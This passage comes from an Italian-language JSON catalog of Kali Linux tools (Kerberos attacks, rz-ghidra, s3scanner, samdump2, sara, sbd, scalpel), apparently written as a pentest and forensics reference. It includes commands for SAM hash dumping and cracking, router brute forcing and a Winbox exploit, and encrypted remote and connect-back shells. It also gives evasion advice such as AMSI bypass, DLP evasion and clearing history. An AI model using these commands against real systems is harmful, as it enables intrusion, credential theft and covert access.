Ticket possono essere rilevati tramite inconsistenze temporali e metadata nei ticket. Le soluzioni EDR moderne hanno signature specifiche per l'assembly Rubeus, richiedendo offuscamento o loader custom per l'evasione.</p><p><strong>Impatto operativo:</strong> Le richieste Kerberos anomale vengono loggate sui Domain Controller e possono generare alert immediati in ambienti con monitoring avanzato. Il Kerberoasting massivo (richiesta TGS per tutti gli SPN) e particolarmente rumoroso e facilmente distinguibile dal comportamento legittimo. L'utilizzo di Golden Ticket con timestamp incoerenti rispetto alla policy del dominio puo essere rilevato da controlli di validazione avanzati. L'account lockout per tentativi di autenticazione falliti rappresenta un rischio collaterale durante l'overpass-the-hash.</p><p><strong>Mitigazioni:</strong> Preferire Kerberoasting selettivo su SPN specifici identificati come ad alto valore piuttosto che enumerazione massiva. Utilizzare cifratura AES anziche RC4 quando possibile per ridurre la distinguibilita delle richieste. Per il caricamento in memoria, utilizzare loader offuscati e tecniche di AMSI bypass. Implementare jitter temporale tra le richieste per evitare pattern di burst facilmente correlabili. Considerare l'utilizzo di Diamond Ticket anziche Golden Ticket per una persistenza piu difficile da rilevare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rz-ghidra",
    "name": "rz-ghidra",
    "version": "0.8.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rz-ghidra/",
    "desc": "Plugin che integra decompiler Ghidra in Rizin per analisi codice decompilato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rz-ghidra</strong> e il plugin ufficiale che integra il decompiler del progetto Ghidra della NSA all'interno del framework Rizin e della sua interfaccia grafica Cutter. Questo plugin permette di ottenere output di decompilazione in pseudo-C direttamente nell'ambiente Rizin, senza la necessita di installare o utilizzare l'IDE Ghidra completo. Il decompiler di Ghidra e ampiamente riconosciuto come uno dei migliori decompiler open-source disponibili, con supporto per numerose architetture tra cui x86, x86-64, ARM, AArch64, MIPS e PowerPC. L'integrazione tramite rz-ghidra e bidirezionale: le modifiche effettuate nel decompiler (rinominazione variabili, cambio tipo dati) vengono propagate alla vista disassembly e viceversa, creando un workflow di analisi fluido. Il plugin e essenziale per trasformare Rizin/Cutter in una piattaforma di reverse engineering completa, paragonabile a soluzioni commerciali come IDA Pro con il plugin Hex-Rays.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Decompilazione pseudo-C multi-architettura:</strong> rz-ghidra sfrutta il SLEIGH processor specification language di Ghidra per supportare la decompilazione di codice compilato per diverse architetture. L'output pseudo-C ricostruisce strutture di controllo (if/else, for, while, switch), chiamate a funzione con parametri, variabili locali e globali, e casting di tipo. La qualita della decompilazione dipende dall'architettura e dal livello di ottimizzazione del compilatore, ma nella maggior parte dei casi produce codice sufficientemente leggibile per comprendere la logica del programma.</p><p><strong>Sincronizzazione bidirezionale con il disassembly:</strong> L'integrazione tra decompiler e disassembly e completa: selezionando una riga nel codice decompilato, il cursore nel pannello disassembly si sposta automaticamente all'istruzione corrispondente e viceversa. Le annotazioni dell'analista (nomi funzioni, nomi variabili, commenti, tipi di dato) vengono condivise tra le due viste, eliminando la necessita di mantenere sincronizzate manualmente due rappresentazioni dello stesso codice. Questa sincronizzazione accelera significativamente il processo di analisi.</p><p><strong>Definizione tipi e strutture personalizzate:</strong> rz-ghidra eredita da Ghidra la capacita di definire strutture dati personalizzate e applicarle alle variabili nel codice decompilato. Quando l'analista identifica una struttura dati (ad esempio una struct con campi specifici), puo definirla e applicarla, trasformando accessi a offset numerici in accessi a campi nominati. Questa funzionalita e fondamentale per l'analisi di software che utilizza strutture dati complesse come kernel, driver e applicazioni con oggetti in stile C++.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>rz-ghidra si integra automaticamente in Rizin una volta installato. In Rizin da riga di comando, il comando <code>pdg</code> invoca il decompiler sulla funzione corrente. In Cutter GUI, il pannello Decompiler e disponibile automaticamente e mostra il pseudo-C della funzione selezionata.</p><pre><code># In Rizin: apertura binario e analisi\nrizin -A target_binary\n\n# Decompilazione della funzione corrente\npdg\n\n# Decompilazione di una funzione specifica\npdg @sym.check_password\npdg @main\n\n# Output decompilato con commenti di indirizzo\npdg*\n\n# In Cutter GUI:\n# 1. Aprire il binario\n# 2. Selezionare una funzione nel pannello Functions\n# 3. Il pannello Decompiler mostra automaticamente il pseudo-C\n# 4. Click su una riga nel decompiler evidenzia l'assembly\n# 5. Rinomina variabile: tasto destro -> Rename variable\n# 6. Cambia tipo: tasto destro -> Set type</code></pre><p>Per ottenere risultati migliori dalla decompilazione, e consigliabile eseguire prima un'analisi completa del binario (<code>aaa</code>) e definire correttamente le signature delle funzioni di libreria note. Il plugin FLIRT (Fast Library Identification and Recognition Technology) di Rizin puo aiutare nell'identificazione automatica delle funzioni di libreria standard.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>reverse engineering di malware</strong>, rz-ghidra permette di comprendere rapidamente la logica di campioni malevoli senza doversi immergere nel codice assembly. L'analista puo identificare routine di cifratura, meccanismi di comunicazione C2, tecniche di evasione e funzionalita di payload leggendo pseudo-C anziche assembly, riducendo significativamente il tempo di analisi specialmente per sample complessi con migliaia di funzioni.</p><p>Per l'<strong>analisi di vulnerabilita in software closed-source</strong>, la decompilazione permette di identificare pattern di codice vulnerabile come buffer overflow, use-after-free, integer overflow e race condition in binari di cui non si dispone del codice sorgente. La possibilita di definire strutture dati personalizzate aiuta nella comprensione dell'organizzazione interna dei dati e nell'identificazione di condizioni di corruzione della memoria.</p><p>Nell'ambito della <strong>ricerca su firmware e dispositivi embedded</strong>, rz-ghidra supporta le architetture tipiche dei dispositivi IoT (ARM, MIPS) permettendo la decompilazione di firmware estratti da router, telecamere IP e dispositivi industriali. La comprensione della logica del firmware attraverso il pseudo-C facilita l'identificazione di backdoor, credenziali hardcoded e vulnerabilita specifiche del dispositivo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> rz-ghidra opera esclusivamente in locale sulla macchina dell'analista, analizzando copie dei binari target senza interazione con sistemi remoti o reti. Lo strumento non genera alcun traffico di rete e non e rilevabile dal target dell'analisi. L'unica considerazione riguarda la sicurezza dell'ambiente di analisi stesso: se il binario analizzato e un campione malware, e necessario assicurarsi che l'analisi avvenga in un ambiente isolato per prevenire esecuzioni accidentali.</p><p><strong>Impatto operativo:</strong> La decompilazione non e una scienza esatta e l'output pseudo-C puo contenere imprecisioni, specialmente con codice pesantemente ottimizzato (loop unrolling, function inlining, tail call optimization) o intenzionalmente offuscato. Le strutture di controllo ricostruite potrebbero non corrispondere esattamente al codice sorgente originale, e variabili e parametri potrebbero essere erroneamente fusi o separati. Per binari molto grandi, la decompilazione di singole funzioni puo richiedere diversi secondi e quantita significative di memoria.</p><p><strong>Mitigazioni:</strong> Verificare sempre le conclusioni tratte dal codice decompilato incrociandole con il disassembly, specialmente per codice critico come routine crittografiche o controlli di sicurezza. Utilizzare l'analisi completa (<code>aaa</code>) prima della decompilazione per migliorare la qualita dell'output. Definire tipi e strutture personalizzate per i dati ricorrenti nel binario per rendere il codice decompilato piu leggibile e accurato. Mantenere aggiornato il plugin per beneficiare dei miglioramenti al decompiler nelle nuove versioni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "s3scanner",
    "name": "s3scanner",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/s3scanner/",
    "desc": "Trova bucket S3 pubblici e misconfigured con enumeration di file e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>S3Scanner</strong> e uno strumento specializzato nell'individuazione e nell'analisi di bucket Amazon S3 pubblici o misconfigured. Amazon S3 (Simple Storage Service) e il servizio di object storage piu utilizzato al mondo, e le misconfigurazioni dei permessi rappresentano una delle cause piu frequenti di data breach nel cloud. S3Scanner automatizza la scoperta di bucket esposti tramite enumerazione basata su wordlist, pattern di naming e keyword specifiche del target, verificando successivamente i permessi effettivi (lettura, scrittura, listing) e il contenuto dei bucket accessibili. Lo strumento e scritto in Go per garantire prestazioni elevate durante le scansioni su larga scala e supporta sia AWS S3 sia servizi compatibili con l'API S3 come DigitalOcean Spaces, MinIO e Wasabi. E uno strumento fondamentale per cloud security assessment, bug bounty e verifiche di conformita, poiche i bucket S3 esposti possono contenere dati sensibili come backup di database, credenziali, documenti riservati e informazioni personali.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Enumerazione e discovery di bucket:</strong> S3Scanner genera nomi di bucket candidati a partire da keyword, pattern di naming comuni e permutazioni specifiche del target. Le strategie di enumerazione includono l'aggiunta di prefissi e suffissi comuni (backup, dev, staging, prod, data, logs), variazioni con trattini e underscore, e combinazioni con il nome del dominio target. La scansione parallela permette di testare migliaia di nomi di bucket in pochi minuti, identificando rapidamente quelli esistenti e potenzialmente esposti.</p><p><strong>Verifica permessi e analisi accesso:</strong> Per ogni bucket scoperto, S3Scanner verifica sistematicamente i permessi effettivi testando le operazioni ListObjects, GetObject, PutObject e GetBucketAcl. Il tool distingue tra bucket pubblici (accessibili a chiunque), bucket con ACL misconfigured (accessibili ad utenti AWS autenticati) e bucket privati correttamente configurati. I risultati vengono classificati per livello di rischio, evidenziando immediatamente i bucket con permessi di scrittura che rappresentano la minaccia piu critica.</p><p><strong>Listing e download dei contenuti:</strong> Per i bucket accessibili in lettura, S3Scanner puo enumerare gli oggetti contenuti mostrando nome, dimensione e data di ultima modifica. La funzionalita di dump permette di scaricare il contenuto completo di bucket pubblici per analisi offline. Il listing dei contenuti spesso rivela immediatamente la natura dei dati esposti: backup SQL, file di configurazione con credenziali, documenti interni e archivi di log contenenti informazioni sensibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>S3Scanner opera da riga di comando con diversi sotto-comandi per le operazioni di scanning, enumerazione e dump. Non richiede credenziali AWS per la scansione di bucket pubblici, ma puo utilizzarle per testare bucket accessibili solo ad utenti autenticati.</p><pre><code># Scansione da lista di nomi bucket\ns3scanner scan -b bucket_names.txt\n\n# Discovery basata su keyword del target\ns3scanner scan -k company-name\ns3scanner scan -k \"company\" -k \"companyname\" -k \"company-backup\"\n\n# Scansione con dump dei contenuti accessibili\ns3scanner scan -b buckets.txt --dump\n\n# Verifica singolo bucket\ns3scanner scan -b my-company-backup\n\n# Enumerazione contenuti di un bucket specifico\ns3scanner scan -b target-bucket-name --list\n\n# Scansione con output in formato JSON\ns3scanner scan -b buckets.txt -o results.json\n\n# Utilizzo con provider S3-compatibili\ns3scanner scan -b buckets.txt --endpoint-url https://nyc3.digitaloceanspaces.com</code></pre><p>Per massimizzare l'efficacia della scansione, e consigliabile costruire la lista di nomi candidati combinando informazioni raccolte durante la fase di ricognizione: nomi di dominio, sotto-domini, nomi di applicazioni, ambienti (dev, staging, prod) e pattern di naming osservati in altre risorse cloud del target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>cloud security assessment</strong>, S3Scanner permette di verificare che tutte le risorse S3 di un'organizzazione siano correttamente configurate con permessi restrittivi. La scansione sistematica di varianti del nome aziendale spesso rivela bucket dimenticati creati da team di sviluppo per test temporanei e mai rimossi o protetti, contenenti potenzialmente dati di produzione o credenziali di accesso.</p><p>Nell'ambito del <strong>bug bounty</strong>, la scoperta di bucket S3 esposti e una delle finding piu comuni e meglio remunerate. Dati sensibili come database di utenti, chiavi API, certificati TLS privati e backup di configurazione trovati in bucket pubblici rappresentano vulnerabilita ad alto impatto. S3Scanner automatizza la fase di discovery permettendo di testare rapidamente centinaia di varianti del nome del target.</p><p>Per <strong>compliance e audit regolatorio</strong>, lo strumento permette di verificare che le risorse cloud rispettino i requisiti di standard come GDPR, HIPAA e PCI-DSS relativamente alla protezione dei dati. L'identificazione proattiva di bucket esposti consente all'organizzazione di correggere le misconfigurazioni prima che vengano sfruttate da attori malevoli o scoperte durante audit formali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP/HTTPS verso l'API S3 di AWS sono loggate in CloudTrail quando il logging e abilitato sul bucket. Le richieste di listing e accesso agli oggetti da parte di IP sconosciuti possono generare alert in organizzazioni con monitoring avanzato del cloud. Il volume di richieste durante una scansione su larga scala puo essere identificato come attivita di enumerazione. AWS puo implementare rate limiting sulle richieste da IP che generano un numero elevato di errori 403/404.</p><p><strong>Impatto operativo:</strong> La scansione genera un volume significativo di richieste HTTP verso i server S3, proporzionale al numero di nomi di bucket candidati testati. L'accesso non autorizzato a dati contenuti in bucket misconfigured, sebbene tecnicamente possibile, potrebbe avere implicazioni legali significative a seconda della giurisdizione. Il download massivo di contenuti da bucket esposti puo richiedere banda e spazio disco considerevoli, e i dati scaricati devono essere trattati con le dovute precauzioni di sicurezza.</p><p><strong>Mitigazioni:</strong> Limitare la velocita di scansione per evitare rate limiting e ridurre la visibilita dell'attivita. Documentare accuratamente le autorizzazioni ottenute prima di procedere con la scansione. Evitare il download di dati personali o sensibili a meno che non sia strettamente necessario per il report dell'assessment. Utilizzare VPN o proxy per separare l'attivita di scansione dall'infrastruttura operativa. Segnalare immediatamente le misconfigurazioni critiche al team di sicurezza del cliente senza attendere la conclusione dell'intero assessment.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "samdump2",
    "name": "samdump2",
    "version": "3.0.0",
    "icon": "../app/icons/samdump2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/samdump2/",
    "desc": "Estrae hash password da file SAM e SYSTEM Windows per cracking offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>samdump2</strong> e uno strumento specializzato per l'estrazione degli hash delle password dal file SAM (Security Account Manager) di Windows, utilizzando la chiave di cifratura contenuta nel file SYSTEM. Il SAM e il database locale di Windows che contiene le credenziali degli utenti sotto forma di hash NTLM e, nei sistemi piu vecchi, hash LM. Samdump2 opera in modalita completamente offline: richiede l'accesso fisico ai file SAM e SYSTEM, precedentemente copiati dal sistema target tramite boot da supporto esterno, copia shadow o utilizzo di strumenti come reg save. Una volta estratti gli hash, questi possono essere sottoposti a cracking offline con strumenti come Hashcat o John the Ripper, oppure utilizzati direttamente in attacchi pass-the-hash. Lo strumento e particolarmente utile in scenari di digital forensics e penetration testing dove si dispone di accesso fisico o privilegiato al sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Estrazione hash NTLM/LM:</strong> Samdump2 decifra il contenuto del file SAM utilizzando il bootkey estratto dal registro SYSTEM. Il processo supporta sia hash NTLM (utilizzati da Windows NT in poi) sia hash LM legacy, producendo un output nel formato standard username:RID:LM_hash:NTLM_hash compatibile con i principali strumenti di cracking.</p><p><strong>Operativita offline completa:</strong> Lo strumento lavora esclusivamente su copie dei file di registro, senza necessita di interagire con un sistema Windows attivo. Questo lo rende ideale per analisi forensi dove il sistema non deve essere alterato, e per situazioni di penetration testing dove i file sono stati estratti tramite volume shadow copy o boot da Kali Live.</p><p><strong>Output compatibile con tool di cracking:</strong> Il formato di output e direttamente importabile in John the Ripper e Hashcat (modo -m 1000 per NTLM puro). Samdump2 gestisce automaticamente la decodifica della struttura binaria del SAM, inclusa la gestione delle diverse versioni di crittografia utilizzate nelle varie edizioni di Windows.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Per utilizzare samdump2 e necessario prima ottenere copie dei file SAM e SYSTEM. Su un sistema live con privilegi amministrativi si possono usare i comandi reg save, mentre su un sistema spento si puo montare il disco e copiare i file dalla directory Windows\\System32\\config.</p><pre><code># Copia file da sistema live con privilegi admin\nreg save HKLM\\SAM sam_backup\nreg save HKLM\\SYSTEM system_backup\n\n# Estrazione hash base\nsamdump2 system_backup sam_backup\n\n# Salvataggio output per cracking successivo\nsamdump2 system_backup sam_backup > hashes.txt\n\n# Cracking con John the Ripper\njohn --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n# Cracking con Hashcat (NTLM mode)\nhashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Accesso offline da Kali Live\nmount /dev/sda2 /mnt\nsamdump2 /mnt/Windows/System32/config/SYSTEM /mnt/Windows/System32/config/SAM</code></pre><p>Nota: su sistemi Windows moderni con Credential Guard o Syskey avanzato, l'estrazione potrebbe richiedere passaggi aggiuntivi. I file SAM e SYSTEM sono bloccati dal sistema operativo durante l'esecuzione e non possono essere copiati direttamente senza privilegi speciali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel penetration testing, samdump2 viene utilizzato dopo aver ottenuto accesso privilegiato a un sistema Windows per estrarre le credenziali locali. Gli hash ottenuti possono rivelare password deboli tramite cracking o essere utilizzati per pass-the-hash contro altri sistemi nella rete che condividono le stesse credenziali locali. In ambito di digital forensics, lo strumento permette di analizzare le credenziali di un sistema sequestrato senza alterare le evidenze, operando su copie forensi dei file di registro. Questo e fondamentale per ricostruire l'attivita degli utenti e verificare la robustezza delle policy password aziendali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'utilizzo di reg save per copiare gli hive di registro genera eventi nel log di sicurezza di Windows. L'accesso ai file SAM e SYSTEM tramite volume shadow copy o boot esterno non lascia tracce sul sistema target, ma l'eventuale modifica dei timestamp di accesso puo essere rilevata in analisi forensi successive.</p><p><strong>Impatto operativo:</strong> Samdump2 non modifica i file originali e opera in sola lettura. Non vi e rischio di corruzione delle credenziali o di blocco degli account. Tuttavia, gli hash estratti devono essere gestiti con attenzione per evitare esposizione non autorizzata di credenziali sensibili.</p><p><strong>Mitigazioni:</strong> Utilizzare copie forensi dei file piuttosto che operare sui file originali. Eliminare i file contenenti hash al termine dell'operazione. Verificare che il sistema target non utilizzi Credential Guard o BitLocker, che possono rendere l'estrazione piu complessa o impossibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sara",
    "name": "sara",
    "version": "1.2",
    "icon": "../app/icons/sara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sara/",
    "desc": "RouterOS security auditing: brute force, config dump, exploit Winbox su Mikrotik.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SARA</strong> (Sekurak RouterOS Audit) e uno strumento di security auditing specificamente progettato per dispositivi Mikrotik che eseguono RouterOS. Mikrotik e uno dei vendor di apparati di rete piu diffusi al mondo, particolarmente popolare tra ISP di piccole e medie dimensioni e in contesti enterprise. SARA integra funzionalita di brute force delle credenziali, dump della configurazione del router, sfruttamento di vulnerabilita note come quelle relative al protocollo Winbox, e capacita di enumeration dei servizi attivi. Lo strumento e stato sviluppato dal team di Sekurak per fornire un framework unificato per il testing di sicurezza di questi dispositivi, che storicamente sono stati oggetto di numerose vulnerabilita critiche incluse CVE che permettevano il bypass dell'autenticazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Brute force multi-protocollo:</strong> SARA supporta attacchi di brute force delle credenziali su tutti i principali protocolli di gestione Mikrotik, inclusi SSH, Telnet, Winbox e API REST. Lo strumento gestisce automaticamente le particolarita di ciascun protocollo, come il meccanismo di autenticazione proprietario di Winbox, e supporta wordlist personalizzate con gestione dei delay per evitare lockout degli account.</p><p><strong>Exploit di vulnerabilita note RouterOS:</strong> Include moduli per lo sfruttamento di vulnerabilita critiche storiche di RouterOS, come il bypass dell'autenticazione Winbox (CVE-2018-14847) che permetteva la lettura di file arbitrari dal router incluse le credenziali. Questi moduli verificano la versione del RouterOS e applicano l'exploit appropriato quando il dispositivo risulta vulnerabile.</p><p><strong>Dump e analisi della configurazione:</strong> Dopo aver ottenuto accesso al dispositivo, SARA puo estrarre la configurazione completa del router incluse regole firewall, configurazione delle interfacce, routing table, utenti configurati e servizi attivi. L'analisi della configurazione evidenzia potenziali debolezze come servizi di gestione esposti su interfacce pubbliche o regole firewall permissive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SARA richiede Python 3 e puo essere eseguito direttamente da riga di comando specificando il target e il tipo di operazione desiderata. Per le operazioni di brute force e necessario specificare le credenziali o le wordlist da utilizzare.</p><pre><code># Enumeration e discovery versione RouterOS\nsara -t 192.168.1.1\n\n# Brute force credenziali SSH\nsara -t 192.168.1.1 -b -u admin -P /usr/share/wordlists/rockyou.txt\n\n# Exploit CVE-2018-14847 (Winbox auth bypass)\nsara -t 192.168.1.1 -e winbox_auth_bypass\n\n# Dump configurazione dopo autenticazione\nsara -t 192.168.1.1 -u admin -p password --dump-config\n\n# Scan range di indirizzi\nsara -t 192.168.1.0/24 --scan\n\n# Brute force su porta Winbox personalizzata\nsara -t 192.168.1.1 -b -u admin -P passwords.txt --port 8291</code></pre><p>Nota: molti router Mikrotik in produzione utilizzano ancora versioni di RouterOS vulnerabili. Verificare sempre la versione prima di tentare exploit specifici e assicurarsi di avere autorizzazione scritta per il testing.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel penetration testing di infrastrutture di rete, SARA viene utilizzato per verificare la sicurezza dei router Mikrotik che spesso rappresentano il perimetro di rete di organizzazioni di piccole e medie dimensioni. La scoperta di credenziali deboli o versioni vulnerabili puo portare al controllo completo dell'infrastruttura di rete. Per ISP e managed service provider, lo strumento consente audit sistematici della flotta di dispositivi Mikrotik per identificare router con firmware obsoleto o configurazioni insicure prima che vengano sfruttati da attaccanti. In contesti di red team, il compromesso di un router perimetrale Mikrotik rappresenta un punto di ingresso privilegiato che permette il monitoraggio del traffico, la modifica delle regole di routing e l'implementazione di attacchi man-in-the-middle sull'intera rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi di brute force generano log sul router Mikrotik e possono attivare meccanismi di blocco IP integrati in RouterOS. L'exploit di vulnerabilita note puo causare crash del servizio Winbox, generando alert visibili agli amministratori. Le query di enumeration dei servizi sono registrate nei log di sistema del dispositivo.</p><p><strong>Impatto operativo:</strong> Il brute force aggressivo puo causare il blocco dell'account admin, rendendo inaccessibile il router. Lo sfruttamento di alcune vulnerabilita puo causare instabilita del dispositivo o riavvii inattesi, con potenziale interruzione del servizio per tutti gli utenti connessi al router. La modifica della configurazione su un dispositivo in produzione puo avere conseguenze immediate sulla connettivita di rete.</p><p><strong>Mitigazioni:</strong> Utilizzare rate limiting nei tentativi di brute force per evitare lockout. Verificare la versione di RouterOS prima di tentare exploit per evitare crash inutili. Operare preferibilmente in finestre di manutenzione concordate e mantenere sempre un backup della configurazione del router prima di qualsiasi operazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "sbd",
    "name": "sbd",
    "version": "1.37",
    "icon": "../app/icons/sbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sbd/",
    "desc": "Secure Backdoor: netcat crittografato con AES per comunicazioni covert persistenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SBD</strong> (Secure BackDoor) e un clone crittografato di Netcat che utilizza cifratura AES-CBC-128 con HMAC-SHA1 per proteggere le comunicazioni di rete. A differenza di Netcat tradizionale che trasmette dati in chiaro, SBD cifra tutto il traffico rendendo impossibile l'analisi del contenuto tramite sniffing passivo. Lo strumento supporta autenticazione tramite chiave condivisa (shared secret), esecuzione di comandi remoti, trasferimento file e puo operare sia come client che come server. SBD e stato progettato come sostituto di Netcat per scenari dove la confidenzialita delle comunicazioni e critica, mantenendo una sintassi familiare e una dimensione binaria ridotta. E disponibile per Linux, Windows e altri sistemi Unix-like, rendendolo versatile per operazioni cross-platform in contesti di penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Cifratura AES-CBC-128 con autenticazione:</strong> Tutte le comunicazioni tra client e server sono cifrate utilizzando AES in modalita CBC con chiave a 128 bit, derivata dalla password condivisa tramite funzione di hash. L'integrita dei messaggi e verificata tramite HMAC-SHA1, prevenendo attacchi di tampering. Questo rende il traffico di SBD indistinguibile da dati casuali per un osservatore di rete.</p><p><strong>Shell remota crittografata:</strong> SBD puo eseguire una shell interattiva sul sistema remoto con tutto il traffico cifrato. Utilizzando l'opzione -e si specifica l'interprete di comandi da eseguire (/bin/bash su Linux, cmd.exe su Windows), creando una sessione di amministrazione remota protetta. A differenza di SSH, non richiede infrastruttura PKI o configurazione utente.</p><p><strong>Trasferimento file sicuro e modalita operativa flessibile:</strong> Lo strumento supporta il trasferimento di file attraverso il canale cifrato utilizzando la redirezione standard di input/output. Puo operare in modalita listener (server) o connect-back (client), supporta timeout configurabili e puo essere utilizzato per creare tunnel cifrati attraverso reti non fidate per operazioni di pivoting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SBD utilizza una sintassi simile a Netcat con l'aggiunta del parametro -k per specificare la chiave di cifratura condivisa. Sia il client che il server devono utilizzare la stessa chiave per comunicare.</p><pre><code># Avvio listener con chiave condivisa\nsbd -l -p 4444 -k mysecretkey\n\n# Connessione al listener\nsbd 192.168.1.100 4444 -k mysecretkey\n\n# Shell remota cifrata (listener)\nsbd -l -p 4444 -k mysecretkey -e /bin/bash\n\n# Shell remota cifrata (client connect-back)\nsbd -e /bin/bash 192.168.1.100 4444 -k mysecretkey\n\n# Trasferimento file (ricevente)\nsbd -l -p 4444 -k mysecretkey > file_ricevuto.bin\n\n# Trasferimento file (mittente)\nsbd 192.168.1.100 4444 -k mysecretkey < file_da_inviare.bin\n\n# Listener con timeout\nsbd -l -p 4444 -k mysecretkey -w 300</code></pre><p>Nota: la chiave condivisa deve essere scambiata attraverso un canale sicuro separato. Se la chiave viene compromessa, tutte le comunicazioni passate e future con la stessa chiave sono esposte.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante operazioni di penetration testing, SBD viene utilizzato come alternativa cifrata a Netcat per stabilire canali di comunicazione protetti con i sistemi compromessi. Questo impedisce che i sistemi IDS/IPS basati su analisi del contenuto possano rilevare comandi e output delle shell remote. In scenari di pivoting attraverso reti segmentate, SBD fornisce tunnel cifrati per il forwarding del traffico, proteggendo le comunicazioni anche quando attraversano segmenti di rete monitorati. Per operazioni di esfiltrazione dati durante red team engagement autorizzati, il trasferimento file cifrato impedisce la detection basata su DLP (Data Loss Prevention) che analizza il contenuto del traffico in uscita.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene il contenuto sia cifrato, il pattern di traffico di SBD puo essere identificato tramite analisi statistica del flusso. Le connessioni persistenti su porte non standard generano alert in sistemi di monitoraggio di rete. Il traffico cifrato su porte tipicamente in chiaro (come 80 o 443 senza handshake TLS) e un indicatore di compromissione facilmente rilevabile.</p><p><strong>Impatto operativo:</strong> Il binario SBD presente su un sistema compromesso rappresenta un artefatto forense significativo. La chiave condivisa potrebbe essere estratta dalla memoria del processo o dalla linea di comando (visibile in /proc o tramite process listing). Non supporta perfect forward secrecy, quindi la compromissione della chiave espone tutte le sessioni.</p><p><strong>Mitigazioni:</strong> Utilizzare porte che si integrano nel traffico legittimo della rete. Eliminare il binario dopo l'uso e ripulire la cronologia dei comandi. Cambiare frequentemente la chiave condivisa tra sessioni. Considerare l'utilizzo di canali C2 piu sofisticati come quelli basati su HTTPS per operazioni che richiedono maggiore stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "scalpel",
    "name": "scalpel",
    "version": "1.60",
    "icon": "../app/icons/scalpel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scalpel/",
    "desc": "File carver veloce per recupero dati da immagini disco basato su header/footer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scalpel</strong> e un file carver ad alte prestazioni progettato per il recupero di file da immagini disco, partizioni raw e dispositivi di archiviazione. Opera in modo completamente indipendente dal filesystem, basandosi esclusivamente sul riconoscimento di header e footer caratteristici dei vari formati di file (magic bytes). Scalpel e un fork di Foremost, riscritto e ottimizzato per offrire prestazioni significativamente superiori e un consumo di memoria ridotto, caratteristiche essenziali quando si lavora con immagini disco di grandi dimensioni. Lo strumento supporta una vasta gamma di formati file predefiniti (JPEG, PNG, PDF, DOC, ZIP e molti altri) e permette la definizione di signature personalizzate tramite un file di configurazione flessibile. E uno degli strumenti fondamentali nel toolkit di un analista forense digitale per il recupero di evidenze cancellate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Carving basato su signature configurabili:</strong> Scalpel utilizza un file di configurazione (scalpel.conf) che definisce header e footer per ogni tipo di file supportato, insieme alla dimensione massima attesa. L'analista puo abilitare o disabilitare specifici tipi di file commentando le righe nel file di configurazione, e puo aggiungere signature personalizzate per formati proprietari o poco comuni, rendendo lo strumento estremamente versatile.</p><p><strong>Ottimizzazione per grandi volumi di dati:</strong> A differenza di altri carver, Scalpel utilizza un approccio a due passate: nella prima scansiona l'intera immagine costruendo un database delle posizioni degli header/footer trovati, nella seconda estrae i file. Questo approccio riduce drasticamente l'uso di memoria RAM e permette di processare immagini disco di centinaia di gigabyte senza problemi di risorse, una caratteristica critica in ambito forense.</p><p><strong>Indipendenza 